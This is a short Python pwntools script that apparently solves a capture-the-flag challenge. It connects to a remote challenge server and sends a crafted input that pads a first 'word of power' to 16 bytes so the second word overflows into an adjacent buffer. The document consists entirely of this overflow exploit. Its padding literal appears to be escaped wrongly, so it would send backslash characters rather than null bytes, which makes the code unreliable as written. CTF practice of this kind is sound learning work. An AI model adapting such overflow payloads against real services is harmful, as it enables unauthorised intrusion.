from pwn import *
HOST = '0.cloud.chals.io'
PORT = 10629
io = remote(HOST, PORT)




word_a_val = b"salvus"


padding = b"\\x00" * (16 - len(word_a_val))


word_b_val = b"silente"


payload = word_a_val + padding + word_b_val


io.recvuntil(b"Enter the first Word of Power: ")
io.sendline(payload)


print(io.recvall().decode())